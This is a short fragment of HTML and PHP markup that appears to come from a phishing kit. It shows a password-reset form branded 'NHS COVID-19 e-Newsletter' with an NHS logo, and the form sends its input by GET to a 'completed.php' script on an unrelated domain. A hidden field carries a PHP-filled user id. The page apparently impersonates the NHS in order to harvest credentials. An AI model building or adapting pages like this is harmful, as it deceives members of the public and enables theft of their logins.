...
#captcha-container {
    margin-bottom: 20px !important
            ...
            "><div id="password-reset-container"><div id="parent-card" class="ux-card"><div id="form-header">
              <form action="https://cimconlightning.com/66274412366004/completed.php" method="GET">
            ...
            <input type="hidden" name="userid" value="<?php echo $client_id;?>"><h3 class="page-title-with-back"><img src="https://www.digitalartsonline.co.uk/cmsdata/features/3655443/nhs-logo-opener.png" width="100"><br>NHS COVID-19 e-Newsletter</h3></div></div><fieldset class="form-group">
